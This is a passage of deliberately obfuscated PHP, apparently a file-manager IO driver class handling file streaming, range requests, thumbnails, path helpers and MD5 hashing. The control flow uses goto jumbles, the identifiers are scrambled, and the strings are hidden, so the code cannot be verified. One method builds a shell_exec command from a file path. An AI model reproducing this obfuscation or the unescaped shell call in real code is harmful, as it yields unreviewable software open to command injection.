µ±” && $D±æ µ±”[$EÂàÀÑõ…¯[29]] == $EÂàÀÑõ…¯[76]) { $d¦£»Ğ™ç = array($EÂàÀÑõ…¯[77] => 0, $EÂàÀÑõ…¯[78] => 0, $EÂàÀÑõ…¯[79] => 0); $this->infoChildren($dÀŒ©Ÿ‰­ƒ, $d¦£»Ğ™ç); $D±æ µ±”[$EÂàÀÑõ…¯[77]] = $d¦£»Ğ™ç[$EÂàÀÑõ…¯[77]]; $D±æ µ±”[$EÂàÀÑõ…¯[80]] = array($EÂàÀÑõ…¯[81] => $d¦£»Ğ™ç[$EÂàÀÑõ…¯[78]], $EÂàÀÑõ…¯[82] => $d¦£»Ğ™ç[$EÂàÀÑõ…¯[79]]); $C«…Ï¸»ãÖ[$dÀŒ©Ÿ‰­ƒ] = $D±æ µ±”; } return $D±æ µ±”; } public function listPath($eÜÑ‚àî‡ä, $FÒ ¹ËÆ = false) { } public function has($Côì•ÔœÜ, $D¼¶–Œáš = false, $D½Î§Üíã = false) { } public function canRead($F´ëç™®) { } public function canWrite($D´ì¶æØ‰ó) { } public function getContent($AµÅğŸÀÚ–) { } public function setContent($EˆÅ…ÁÚ‚¥, $a×‰„¾Š×‹ = '') { } protected function infoChildren($d±Òôõ‡‘Í, &$BÜŒ‚ã õ) { $cßÉß¹Š» =& $_SERVER[Æ]; check_abort(); $bĞ®ÅÔÎùå = $this->listPath($d±Òôõ‡‘Í, !0); $bĞ®ÅÔÎùå = array_merge($bĞ®ÅÔÎùå[$cßÉß¹Š»[74]], $bĞ®ÅÔÎùå[$cßÉß¹Š»[73]]); foreach ($bĞ®ÅÔÎùå as $c‚â´çÀŞÈ) { if ($c‚â´çÀŞÈ[$cßÉß¹Š»[29]] == $cßÉß¹Š»[76]) { $BÜŒ‚ã õ[$cßÉß¹Š»[79]]++; $fÂ Ë×™‡÷ = $this->getPathInner($c‚â´çÀŞÈ[$cßÉß¹Š»[75]]); $this->infoChildren($fÂ Ë×™‡÷, $BÜŒ‚ã õ); } else { $BÜŒ‚ã õ[$cßÉß¹Š»[78]]++; $BÜŒ‚ã õ[$cßÉß¹Š»[77]] += $c‚â´çÀŞÈ[$cßÉß¹Š»[77]]; } } } public function fileSubstr($e¯—˜º¿ˆ², $d›¶¢Æ³¦, $cÛæÃäŠô) { } public function listAll($cÚŞ‰™‹¢˜) { } public function upload($C’„¤¹¹õô, $DÀ¶î½ùï, $c”ßØ¾§£ = false, $EÉƒ­¸èÚÂ = REPEAT_REPLACE) { } public function uploadFileByID($A‰áğ£Ñª, $F­Íˆç‰š, $A•îœ¨¼ƒó) { } public function uploadFileByPath($D¤ÃÃ‚µÎ, $e‚·ì«Š§á, $dó®©»¥ÏŒ = array()) { } public function isUploadServer() { $d´‡ø„·Â =& $_SERVER[Æ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $d´‡ø„·Â[83]) { return !0; } return $GLOBALS[$d´‡ø„·Â[6]][$d´‡ø„·Â[84]][$d´‡ø„·Â[85]]; } public function isFileOutServer() { $CØö×Ç‚‰˜ =& $_SERVER[Æ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $CØö×Ç‚‰˜[83]) { return !0; } return $GLOBALS[$CØö×Ç‚‰˜[6]][$CØö×Ç‚‰˜[84]][$CØö×Ç‚‰˜[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($cÀ´µ„„Å) { $FÈÌ­²¶Ğâ =& $_SERVER[Æ]; if (!$this->isCdnHost()) { return $cÀ´µ„„Å; } return str_replace(trim(get_url_root($cÀ´µ„„Å), $FÈÌ­²¶Ğâ[8]), trim($this->cdnHost, $FÈÌ­²¶Ğâ[8]), $cÀ´µ„„Å); } public function uploadLink($F‘ó©ğ¯…Ö, $D˜ôíÅ‰Ú = 0) { goto F—ˆöÅ‰È; Dšëò—À‰”: $B¥Ö¢ùñÁÇ = $D˜ôíÅ‰Ú <= $Aµ¦¤Æ“¡“ ? $c™Çµš‹‡[87] : $c™Çµš‹‡[88]; $D£áºŞ›º = (!$D˜ôíÅ‰Ú ? 1 : ceil($D˜ôíÅ‰Ú / pow(1024, 3))) * 3600 * 4; $c·ô‘»£Í = $this->{$B¥Ö¢ùñÁÇ}($F‘ó©ğ¯…Ö, $D£áºŞ›º); goto D«Õ¹®İÎç; F—ˆöÅ‰È: $c™Çµš‹‡ =& $_SERVER[Æ]; if ($this->isUploadServer()) { return; } $eäÌ¨•ªÇ¤ = $this->getType(); goto BíßË‘¥œ²; BíßË‘¥œ²: if (!in_array($eäÌ¨•ªÇ¤, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Aµ¦¤Æ“¡“ = 1024 * 1024 * 10; goto Dšëò—À‰”; D«Õ¹®İÎç: if ($c·ô‘»£Í) { $c·ô‘»£Í[$c™Çµš‹‡[89]] = $F‘ó©ğ¯…Ö; $c·ô‘»£Í[$c™Çµš‹‡[90]] = $eäÌ¨•ªÇ¤; } return $c·ô‘»£Í; goto dÓæ÷è¿Œ; dÓæ÷è¿Œ: } public function uploadFormData($c¹ù†„íôŠ, $E¶÷÷˜åĞ‡ = 3600) { } public function multiUploadFormData($A˜ôÂ¯×˜, $Dæç±šó»µ = 3600) { } public function download($AĞÀêœÂ®´, $e£É´Ú† ­) { } public function ext($aÒĞŞ¦…) { $Bïô‹ÚìÙì =& $_SERVER[Æ]; if (strpos($aÒĞŞ¦…, $Bïô‹ÚìÙì[8]) === -1) { $D­×¯×‰¥ñ = $aÒĞŞ¦…; } else { $D­×¯×‰¥ñ = $this->pathThis($aÒĞŞ¦…); } $EŒ§ÚèŠò¶ = $Bïô‹ÚìÙì[33]; if (strstr($D­×¯×‰¥ñ, $Bïô‹ÚìÙì[91])) { $EŒ§ÚèŠò¶ = substr($D­×¯×‰¥ñ, strrpos($D­×¯×‰¥ñ, $Bïô‹ÚìÙì[91]) + 1); $EŒ§ÚèŠò¶ = strtolower($EŒ§ÚèŠò¶); } if (strlen($EŒ§ÚèŠò¶) > 3 && preg_match($Bïô‹ÚìÙì[92], $EŒ§ÚèŠò¶, $EÏ  Î˜…)) { $EŒ§ÚèŠò¶ = $Bïô‹ÚìÙì[33]; } return $EŒ§ÚèŠò¶; } public function pathThis($D÷Ö¡ÔôÍ¸) { $EæùĞÌ˜ø =& $_SERVER[Æ]; $D÷Ö¡ÔôÍ¸ = str_replace($EæùĞÌ˜ø[93], $EæùĞÌ˜ø[8], rtrim($D÷Ö¡ÔôÍ¸, $EæùĞÌ˜ø[8])); $Càçµ¥ì´ƒ = strrpos($D÷Ö¡ÔôÍ¸, $EæùĞÌ˜ø[8]); if ($Càçµ¥ì´ƒ === !1) { return $D÷Ö¡ÔôÍ¸; } return substr($D÷Ö¡ÔôÍ¸, $Càçµ¥ì´ƒ + 1); } public function pathFather($EÖÚ­ßÌ²¹) { $f”¶ù™ˆäİ =& $_SERVER[Æ]; $EÖÚ­ßÌ²¹ = str_replace($f”¶ù™ˆäİ[93], $f”¶ù™ˆäİ[8], rtrim($EÖÚ­ßÌ²¹, $f”¶ù™ˆäİ[8])); $DÎéÉÌÇ = strrpos($EÖÚ­ßÌ²¹, $f”¶ù™ˆäİ[8]); if ($DÎéÉÌÇ === !1) { return $f”¶ù™ˆäİ[33]; } return substr($EÖÚ­ßÌ²¹, 0, $DÎéÉÌÇ + 1); } public function hashSimple($BËø½Ş™œÌ) { goto FÙ¨ä­À“«; Fã±¸ñ…¢«: $Aâ’ë‘à .= $this->fileSubstr($BËø½Ş™œÌ, $b«‹®Åê‰ - $E‡Û—‚™‚–, $E‡Û—‚™‚–); return md5($Aâ’ë‘à) . $b«‹®Åê‰; goto eÎ“ÎÎµšÈ; cÚ›ÚÒ§ƒ: $dà‘…¾‰Ã• = intval($b«‹®Åê‰ / $a×£Ó„Ò×); $Aâ’ë‘à = $CÆÌ·Óœ²ß[33]; for ($f­«Üñï„ß = 0; $f­«Üñï„ß < $a×£Ó„Ò×; $f­«Üñï„ß++) { $Aâ’ë‘à .= $this->fileSubstr($BËø½Ş™œÌ, $dà‘…¾‰Ã• * $f­«Üñï„ß, $E‡Û—‚™‚–); } goto Fã±¸ñ…¢«; BÁ»œèšğ»: $E‡Û—‚™‚– = 200; $a×£Ó„Ò× = 50; if ($b«‹®Åê‰ <= $E‡Û—‚™‚– * $a×£Ó„Ò×) { return $this->hashMd5($BËø½Ş™œÌ) . $b«‹®Åê‰; } goto cÚ›ÚÒ§ƒ; FÙ¨ä­À“«: $CÆÌ·Óœ²ß =& $_SERVER[Æ]; if (!$BËø½Ş™œÌ) { return md5($CÆÌ·Óœ²ß[33]); } $b«‹®Åê‰ = $this->size($BËø½Ş™œÌ); goto BÁ»œèšğ»; eÎ“ÎÎµšÈ: } public static $md5Cache = array(); public function hashMd5($DĞˆµÚ¢ç) { $DĞˆµÚ¢ç = $this->iconvSystem($DĞˆµÚ¢ç); if (isset(self::$md5Cache[$DĞˆµÚ¢ç])) { return self::$md5Cache[$DĞˆµÚ¢ç]; } self::$md5Cache[$DĞˆµÚ¢ç] = $this->hashMd5Shell($DĞˆµÚ¢ç); if (!self::$md5Cache[$DĞˆµÚ¢ç]) { self::$md5Cache[$DĞˆµÚ¢ç] = @md5_file($DĞˆµÚ¢ç); } return self::$md5Cache[$DĞˆµÚ¢ç]; } private function hashMd5Shell($A†÷ç±´Şë) { goto fÏåÒ£·¡; f´ŠÆÖŒÊ: $aßëØèô†½ = Cache::get($F³µ±‰Éß‹[97]); if (!$aßëØèô†½) { $d¼‹‚ÊÅ©î = BASIC_PATH . $F³µ±‰Éß‹[98]; $B‘‘Ûª¬ÊÑ = md5_file($d¼‹‚ÊÅ©î); $aßëØèô†½ = $F³µ±‰Éß‹[99]; foreach ($fƒ¶÷çğ“ì as $c“Øé¼ŞÌ¹) { $bÈÒŠ›ƒ’ = shell_exec($c“Øé¼ŞÌ¹ . "\x20\42{$d¼‹‚ÊÅ©î}\x22"); if ($bÈÒŠ›ƒ’ && substr(trim($bÈÒŠ›ƒ’), 0, 32) == $B‘‘Ûª¬ÊÑ) { $aßëØèô†½ = $c“Øé¼ŞÌ¹; break; } } Cache::set($F³µ±‰Éß‹[97], $aßëØèô†½, 3600); } if ($aßëØèô†½ == $F³µ±‰Éß‹[99]) { return !1; } goto F¦’ä«»º¹; F¦’ä«»º¹: $bÈÒŠ›ƒ’ = shell_exec($aßëØèô†½ . "\x20\42{$A†÷ç±´Şë}\x22"); $bÈÒŠ›ƒ’ = str_replace($F³µ±‰Éß‹[100], $F³µ±‰Éß‹[33], $bÈÒŠ›ƒ’); return substr($bÈÒŠ›ƒ’, 0, 32); goto côà‹Ä¯Û; fÏåÒ£·¡: $F³µ±‰Éß‹ =& $_SERVER[Æ]; if (!function_exists($F³µ±‰Éß‹[94])) { return !1; } $fƒ¶÷çğ“ì = array($F³µ±‰Éß‹[95], $F³µ±‰Éß‹[96]); goto f´ŠÆÖŒÊ; côà‹Ä¯Û: } public function link($cÛÆÂİÙÍŒ) { return $cÛÆÂİÙÍŒ; } public function fileOut($C»É½ßî´, $c¶® ô¢… = false, $cÑö…ÕÜĞ– = false, $b »Ü‰éŒ = '') { goto f¢ó–Âé·’; D¹ˆÃà¹Û: $CˆÒ¹ÚØ“© = $B¦ç°ï “¯[$F™Áµ×‚„…[77]]; $dËØŞ‹Şç = gmdate($F™Áµ×‚„…[106], $B¦ç°ï “¯[$F™Áµ×‚„…[107]]); $AŒ­àñÜöÉ = $cÑö…ÕÜĞ– ? $cÑö…ÕÜĞ– : $this->iconvApp($B¦ç°ï “¯[$F™Áµ×‚„…[28]]); goto Böîø…´ç; Böîø…´ç: $DÏ ¨Î«„ù = 0; $D‡âîÖó¹ = $CˆÒ¹ÚØ“© - 1; $F”Ï»™·… = $this->ext($AŒ­àñÜöÉ); goto fŠó‘¤º Ú; F²ß¾Úæ®“: $E¢Ö¶çáó = !0; if ($_SERVER[$F™Áµ×‚„…[151]] == $F™Áµ×‚„…[152] && $CˆÒ¹ÚØ“© > 1204 * 1024 * 1024 * 2) { $E¢Ö¶çáó = !1; } if ($E¢Ö¶çáó) { header($F™Áµ×‚„…[153] . ($D‡âîÖó¹ - $DÏ ¨Î«„ù + 1)); } goto fŠªâ¶«æ‡; F…ïô‚¢ë: header($F™Áµ×‚„…[135] . $CˆÒ¹ÚØ“©); header($F™Áµ×‚„…[136]); if (!$c¶® ô¢… && $F”Ï»™·… == $F™Áµ×‚„…[137]) { if ($CˆÒ¹ÚØ“© > 1024 * 1024 * 5) { die; } $fñè¯ˆô¢Ø = $this->getContent($C»É½ßî´); $fñè¯ˆô¢Ø = Html::clearSVG($fñè¯ˆô¢Ø); header($F™Áµ×‚„…[138] . $CˆÒ¹ÚØ“©); echo $fñè¯ˆô¢Ø; die; } goto A¿¬ï¡¾ïä; fŠó‘¤º Ú: if (in_array($F”Ï»™·…, array($F™Áµ×‚„…[108], $F™Áµ×‚„…[109], $F™Áµ×‚„…[110], $F™Áµ×‚„…[111]))) { $F”Ï»™·… = $F™Áµ×‚„…[112]; } if (!$b »Ü‰éŒ) { $b »Ü‰éŒ = md5($dËØŞ‹Şç . $this->hashSimple($C»É½ßî´)); } $b »Ü‰éŒ = $F™Áµ×‚„…[113] . $b »Ü‰éŒ . $F™Áµ×‚„…[113]; goto FÂ›“‹©ğ…; b°ÁÅ‚Û××: header($F™Áµ×‚„…[125]); header($F™Áµ×‚„…[126]); header($F™Áµ×‚„…[127]); goto bÍ’¿­ñæß; AÌİãµİé·: if ($A–¼Ğ››“) { $dÌ„ÑÌ“ë– = intval(1000 * 1000 * ($e¦¥Á–®ô¾ / $A–¼Ğ››“)); } while ($DÏ ¨Î«„ù <= $D‡âîÖó¹) { $f¦÷ÚˆŠĞ¨ = timeFloat(); check_abort(); $dÙ¤Ù í‡ø = $D‡âîÖó¹ - $DÏ ¨Î«„ù + 1; if ($dÙ¤Ù í‡ø <= $e¦¥Á–®ô¾) { $e¦¥Á–®ô¾ = $dÙ¤Ù í‡ø; } echo $this->fileSubstr($C»É½ßî´, $DÏ ¨Î«„ù, $e¦¥Á–®ô¾); $DÏ ¨Î«„ù += $e¦¥Á–®ô¾; if ($e¦¥Á–®ô¾ == $dÙ¤Ù í‡ø) { $DÏ ¨Î«„ù = $D‡âîÖó¹ + 1; } if ($dÌ„ÑÌ“ë–) { $d¡¨‚Á± = intval(1000 * 1000 * (timeFloat() - $f¦÷ÚˆŠĞ¨)); $b‚ç‰›ÜÙÒ = $dÌ„ÑÌ“ë– - $d¡¨‚Á±; if ($b‚ç‰›ÜÙÒ > 5) { usleep($b‚ç‰›ÜÙÒ); } } } goto BÒÉª©ïÏ; bÍ’¿­ñæß: if (isset($_SERVER[$F™Áµ×‚„…[128]]) && strtotime($_SERVER[$F™Áµ×‚„…[128]]) == $B¦ç°ï “¯[$F™Áµ×‚„…[107]]) { header($F™Áµ×‚„…[129], !0, 304); die; } if (isset($_SERVER[$F™Áµ×‚„…[130]]) && $_SERVER[$F™Áµ×‚„…[130]] == $b »Ü‰éŒ) { header($F™Áµ×‚„…[131] . $b »Ü‰éŒ, !0, 304); die; } header($F™Áµ×‚„…[131] . $b »Ü‰éŒ); goto C½Ïõ½ç“; EÔ¯¤å•¼: $Cƒ ‹ŠÚğÊ = rawurlencode($AŒ­àñÜöÉ); $Cƒ ‹ŠÚğÊ = $F™Áµ×‚„…[113] . $Cƒ ‹ŠÚğÊ . $F™Áµ×‚„…[117] . $Cƒ ‹ŠÚğÊ; if ($c¶® ô¢…) { header($F™Áµ×‚„…[118]); header($F™Áµ×‚„…[119] . $Cƒ ‹ŠÚğÊ); } else { header($F™Áµ×‚„…[120] . $Cƒ ‹ŠÚğÊ); } goto e‹Ÿøí‡”õ; A¿¬ï¡¾ïä: $f‚®ì±›’ = strtolower($_SERVER[$F™Áµ×‚„…[139]]); if ($A”°Á®Àì && $f‚®ì±›’ && $a™İñ–Ö½ñ) { if (strstr($f‚®ì±›’, $F™Áµ×‚„…[140])) { header($F™Áµ×‚„…[141] . $C»É½ßî´); } else { if (strstr($f‚®ì±›’, $F™Áµ×‚„…[142])) { header($F™Áµ×‚„…[143] . $C»É½ßî´); } else { if (strstr($f‚®ì±›’, $F™Áµ×‚„…[144])) { header($F™Áµ×‚„…[145] . $C»É½ßî´); } } } if ($A–¼Ğ››“) { header($F™Áµ×‚„…[146] . $A–¼Ğ››“); } return; } if (isset($_SERVER[$F™Áµ×‚„…[147]])) { if (preg_match($F™Áµ×‚„…[148], $_SERVER[$F™Áµ×‚„…[147]], $dò‚ŞÍä×)) { $DÏ ¨Î«„ù = intval($dò‚ŞÍä×[1]); if (!empty($dò‚ŞÍä×[2])) { $D‡âîÖó¹ = intval($dò‚ŞÍä×[2]); } } header($F™Áµ×‚„…[149]); header("\103\157\156\x74\x65\156\164\55\x52\141\x6e\x67\145\x3a\40\x62\x79\x74\145\x73\40{$DÏ ¨Î«„ù}\55{$D‡âîÖó¹}\57" . $CˆÒ¹ÚØ“©); } else { header($F™Áµ×‚„…[150]); } goto F²ß¾Úæ®“; C½Ïõ½ç“: header($F™Áµ×‚„…[132] . $dËØŞ‹Şç . $F™Áµ×‚„…[124]); header($F™Áµ×‚„…[133] . $AŒ­àñÜöÉ); header($F™Áµ×‚„…[134]); goto F…ïô‚¢ë; e‹Ÿøí‡”õ: header($F™Áµ×‚„…[121]); header($F™Áµ×‚„…[122] . $Cµ„ƒöêßî); header($F™Áµ×‚„…[123] . gmdate($F™Áµ×‚„…[106], time() + 3600 * 24 * 30) . $F™Áµ×‚„…[124]); goto b°ÁÅ‚Û××; Bî†’Œ¿†•: $A”°Á®Àì = $this->getType() == $F™Áµ×‚„…[102]; $a™İñ–Ö½ñ = $GLOBALS[$F™Áµ×‚„…[6]][$F™Áµ×‚„…[84]][$F™Áµ×‚„…[103]][$F™Áµ×‚„…[104]]; $A–¼Ğ››“ = (double) $GLOBALS[$F™Áµ×‚„…[6]][$F™Áµ×‚„…[84]][$F™Áµ×‚„…[103]][$F™Áµ×‚„…[105]] * 1024 * 1024; goto d«ˆ‡†¥ÉÄ; f¢ó–Âé·’: $F™Áµ×‚„… =& $_SERVER[Æ]; $this->cacheMethod(null, null); if (!$C»É½ßî´ || !$this->exist($C»É½ßî´)) { show_json(LNG($F™Áµ×‚„…[101]), !1, $cÑö…ÕÜĞ–); } goto Bî†’Œ¿†•; fŠªâ¶«æ‡: if ($_SERVER[$F™Áµ×‚„…[154]] == $F™Áµ×‚„…[155]) { return; } $e¦¥Á–®ô¾ = 1024 * 100; $dÌ„ÑÌ“ë– = 0; goto AÌİãµİé·; FÂ›“‹©ğ…: $Cµ„ƒöêßî = get_file_mime($F”Ï»™·…); if (strstr($Cµ„ƒöêßî, $F™Áµ×‚„…[114])) { $Cµ„ƒöêßî = $Cµ„ƒöêßî . $F™Áµ×‚„…[115]; } if ($c¶® ô¢… === !1 && !mime_support($Cµ„ƒöêßî)) { $c¶® ô¢… = !0; $Cµ„ƒöêßî = $F™Áµ×‚„…[116]; } goto EÔ¯¤å•¼; d«ˆ‡†¥ÉÄ: @ob_end_clean(); set_timeout(); $B¦ç°ï “¯ = $this->infoFull($C»É½ßî´); goto D¹ˆÃà¹Û; BÒÉª©ïÏ: } public function fileOutServer($C”©ì††¥Û, $a“²ĞØá¬à = false, $Bá¡£˜ = false, $E¡ŞÍ¾™°« = '') { $this->fileOut($C”©ì††¥Û, $a“²ĞØá¬à, $Bá¡£˜, $E¡ŞÍ¾™°«); } public function fileOutLink($AÓà¦²˜²µ) { header($_SERVER[Æ][156] . $AÓà¦²˜²µ); die; } public function cacheMethod($E¡ĞÎ­–¹Ë, $Aæ©Î“Ì‹) { goto bß¸î„Àˆğ; BõåíÉ—×¶: return $e®ôÄ¡æó«; goto BæËÉãî‹; AËÇí¡™…¦: if (is_null($E¡ĞÎ­–¹Ë)) { $CƒÙö‘ñÔ = array(); return; } if (is_null($Aæ©Î“Ì‹)) { unset($CƒÙö‘ñÔ[$BÊ×š²«ºª]); return; } $e®ôÄ¡æó« = isset($CƒÙö‘ñÔ[$BÊ×š²«ºª]) ? $CƒÙö‘ñÔ[$BÊ×š²«ºª] : null; goto bÖ°ªĞ½ö°; bÖ°ªĞ½ö°: if (!is_null($e®ôÄ¡æó«)) { return $e®ôÄ¡æó«; } $e®ôÄ¡æó« = $this->{$E¡ĞÎ­–¹Ë}($Aæ©Î“Ì‹); $CƒÙö‘ñÔ[$BÊ×š²«ºª] = $e®ôÄ¡æó«; goto BõåíÉ—×¶; bß¸î„Àˆğ: $cĞÊ©îî±¢ =& $_SERVER[Æ]; static $CƒÙö‘ñÔ = array(); $BÊ×š²«ºª = $cĞÊ©îî±¢[157] . $E¡ĞÎ­–¹Ë . $cĞÊ©îî±¢[158] . rtrim($Aæ©Î“Ì‹, $cĞÊ©îî±¢[8]); goto AËÇí¡™…¦; BæËÉãî‹: } public function fileOutImage($Bç÷ÂÂÏ, $B™‘ä•’øœ = 250) { goto EèîàÎõØù; c“îÎó£¨: if ($b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[77]] <= 1024 * 50 || !function_exists($aÎ®³ËõÂ­[159]) || $b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[160]] == $aÎ®³ËõÂ­[161]) { return $this->fileOut($Bç÷ÂÂÏ); } if (isset($b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[162]][$aÎ®³ËõÂ­[163]])) { $B¬µ†êËÒ§ = $b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[162]][$aÎ®³ËõÂ­[163]]; } else { if (isset($b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[162]][$aÎ®³ËõÂ­[164]])) { $B¬µ†êËÒ§ = $b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[162]][$aÎ®³ËõÂ­[164]]; } else { $B¬µ†êËÒ§ = md5("{$b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[28]]}\x5f{$b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[75]]}\137{$b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[77]]}"); } } $a¡èˆÉ¶µˆ = "{$B¬µ†êËÒ§}\x5f{$B™‘ä•’øœ}\x2e\x70\x6e\147"; goto Cæ¥Ã¨Ø§; Cæ¥Ã¨Ø§: if (!($Dá¢’ñÑ–‹ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $aÎ®³ËõÂ­[165]))) { $C®ë÷¥æÉ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $aÎ®³ËõÂ­[166]); } else { $C®ë÷¥æÉ = KodIO::make($Dá¢’ñÑ–‹); } if ($Dá¢’ñÑ–‹ = IO::fileNameExist($C®ë÷¥æÉ, $a¡èˆÉ¶µˆ)) { $E§ì•»÷¥ = KodIO::make($Dá¢’ñÑ–‹); return IO::fileOut($E§ì•»÷¥); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto D„ÀÎ²¢È; D„ÀÎ²¢È: $E§ì•»÷¥ = DATA_THUMB . $a¡èˆÉ¶µˆ; if (!@file_exists($E§ì•»÷¥)) { $CÀòÌ‰É—Â = TEMP_FILES; if (!is_dir($CÀòÌ‰É—Â)) { mk_dir($CÀòÌ‰É—Â); } $E÷ŒÓ˜„¤ = $CÀòÌ‰É—Â . $B¬µ†êËÒ§ . $aÎ®³ËõÂ­[91] . $b¨¾¿º¶ƒÒ[$aÎ®³ËõÂ­[160]]; if (!@file_exists($E÷ŒÓ˜„¤)) { $E÷ŒÓ˜„¤ = $this->download($Bç÷ÂÂÏ, $E÷ŒÓ˜„¤); } $A¹‘Ììâ† = new ImageThumb($E÷ŒÓ˜„¤, $aÎ®³ËõÂ­[167]); $A¹‘Ììâ†->prorate($E§ì•»÷¥, $B™‘ä•’øœ, $B™‘ä•’øœ * 10); } if (!file_exists($E§ì•»÷¥) || filesize($E§ì•»÷¥) < 100) { return @file_exists($E÷ŒÓ˜„¤) ? IO::fileOut($E÷ŒÓ˜„¤) : $this->fileOut($Bç÷ÂÂÏ); } goto B…­¿‚Èê˜; B…­¿‚Èê˜: if (!($C»Ãèï = IO::move($E§ì•»÷¥, $C®ë÷¥æÉ))) { return IO::fileOut($E§ì•»÷¥); } del_file($E§ì•»÷¥); IO::fileOut($C»Ãèï); goto b„ˆË¤¡ëó; EèîàÎõØù: $aÎ®³ËõÂ­ =& $_SERVER[Æ]; if (substr($Bç÷ÂÂÏ, 0, 4) == $aÎ®³ËõÂ­[144]) { $this->fileOutLink($Bç÷ÂÂÏ); } $b¨¾¿º¶ƒÒ = $this->info($Bç÷ÂÂÏ); goto c“îÎó£¨; b„ˆË¤¡ëó: } public function fileOutImageServer($Eõ“›­ç˜¹, $b—§½ç†Û• = 250) { $this->fileOutImage($Eõ“›­ç˜¹, $b—§½ç†Û•); } public function fileNameAuto($dĞÜ†ä±, $fÌæÄ‘† •, $Fİ‡äğ¢¿Œ = REPEAT_RENAME, $CÀµõ‚ôŠ = false) { goto EÁĞ„„ß“õ; aÃĞ¶‚ñÕë: if ($Fİ‡äğ¢¿Œ == REPEAT_SKIP) { return !1; } $b‚¶ç‚”¿ò = $Cœ¬»ÊÄƒÖ[91] . get_path_ext($fÌæÄ‘† •); $b‚¶ç‚”¿ò = $b‚¶ç‚”¿ò == $Cœ¬»ÊÄƒÖ[91] || $CÀµõ‚ôŠ ? $Cœ¬»ÊÄƒÖ[33] : $b‚¶ç‚”¿ò; goto aŠ§İãÌ“; EÁĞ„„ß“õ: $Cœ¬»ÊÄƒÖ =& $_SERVER[Æ]; $D¡é‚È»ˆ = $dĞÜ†ä± === $Cœ¬»ÊÄƒÖ[33] ? $fÌæÄ‘† • : rtrim($dĞÜ†ä±, $Cœ¬»ÊÄƒÖ[8]) . $Cœ¬»ÊÄƒÖ[8] . $fÌæÄ‘† •; if ($Fİ‡äğ¢¿Œ == REPEAT_REPLACE || !$this->exist($D¡é‚È»ˆ) || $CÀµõ‚ôŠ && $Fİ‡äğ¢¿Œ != REPEAT_RENAME_FOLDER) { return $fÌæÄ‘† •; } goto aÃĞ¶‚ñÕë; d…‡Çßòóø: while ($this->exist(rtrim($dĞÜ†ä±, $Cœ¬»ÊÄƒÖ[8]) . $Cœ¬»ÊÄƒÖ[8] . $f³ÁÔÖÔİ)) { $f³ÁÔÖÔİ = $b·†‘‹îğë . "\50{$A—Î¡†ñâ­}\x29{$b‚¶ç‚”¿ò}"; $A—Î¡†ñâ­++; } return $f³ÁÔÖÔİ; goto dğĞïá‚Ãí; aŠ§İãÌ“: $A—Î¡†ñâ­ = 1; $b·†‘‹îğë = substr($fÌæÄ‘† •, 0, strlen($fÌæÄ‘† •) - strlen($b‚¶ç‚”¿ò)); $f³ÁÔÖÔİ = $b·†‘‹îğë . "\50{$A—Î¡†ñâ­}\51{$b‚¶ç‚”¿ò}"; goto d…‡Çßòóø; dğĞïá‚Ãí: } public function listAllFiles($fŒºº…Íš, $eñ´ë§¸ã, $fšé±Ûƒ© = array()) { goto b¨ÌÖë¢•è; BÌšÉ´–é±: $fŒºº…Íš = trim($fŒºº…Íš, $C—Ó½í¬Œ[8]); foreach ($eñ´ë§¸ã as $C÷ Ë¢ÁÎ») { $bÆ×Åô¯‚Œ = ltrim(substr($C÷ Ë¢ÁÎ», strlen($fŒºº…Íš)), $C—Ó½í¬Œ[8]); $CëÜ¶ÔˆìÆ = array_merge($CëÜ¶ÔˆìÆ, $this->slicePath($bÆ×Åô¯‚Œ)); } $Fß¦¼§Âè = array(); goto Aßù£Ÿïªç; b¨ÌÖë¢•è: $C—Ó½í¬Œ =& $_SERVER[Æ]; if (empty($eñ´ë§¸ã)) { return array(); } $CëÜ¶ÔˆìÆ = array(); goto BÌšÉ´–é±; Aßù£Ÿïªç: foreach (array_unique($CëÜ¶ÔˆìÆ) as $C÷ Ë¢ÁÎ») { $fÂæÎ‚õ¼ = array($C—Ó½í¬Œ[75] => $this->getPathOuter($C—Ó½í¬Œ[8] . $fŒºº…Íš . $C—Ó½í¬Œ[8] . $C÷ Ë¢ÁÎ»), $C—Ó½í¬Œ[76] => 1, $C—Ó½í¬Œ[77] => 0); if (substr($C÷ Ë¢ÁÎ», -1) != $C—Ó½í¬Œ[8]) { $fÂæÎ‚õ¼[$C—Ó½í¬Œ[76]] = 0; $Bßå¥°©Ïİ = $this->getPath($fŒºº…Íš . $C—Ó½í¬Œ[8] . $C÷ Ë¢ÁÎ»); $fÂæÎ‚õ¼[$C—Ó½í¬Œ[77]] = isset($fšé±Ûƒ©[$Bßå¥°©Ïİ]) ? $fšé±Ûƒ©[$Bßå¥°©Ïİ] : $this->size($Bßå¥°©Ïİ); } $Fß¦¼§Âè[] = $fÂæÎ‚õ¼; } return $Fß¦¼§Âè; goto e¿·´ÓßÇ; e¿·´ÓßÇ: } public function slicePath($DŒ«ø¦Ò‹) { $e°õàòñÅ =& $_SERVER[Æ]; $AÇÇ÷²ù— = explode($e°õàòñÅ[8], trim($DŒ«ø¦Ò‹, $e°õàòñÅ[8])); $CŒ«·ªÅ¦¹ = 0; do { ++$CŒ«·ªÅ¦¹; $Bß¾ÇÖ……[] = implode($e°õàòñÅ[8], array_slice($AÇÇ÷²ù—, 0, $CŒ«·ªÅ¦¹)) . $e°õàòñÅ[8]; } while ($CŒ«·ªÅ¦¹ < count($AÇÇ÷²ù—)); $Bß¾ÇÖ……[count($AÇÇ÷²ù—) - 1] = $DŒ«ø¦Ò‹; return $Bß¾ÇÖ……; } public function getHost() { $f¸ òêñ¶· =& $_SERVER[Æ]; $E¨¤‡‹Ã…§ = parse_url(trim($this->domain, $f¸ òêñ¶·[8])); $Eßìê«À´æ = 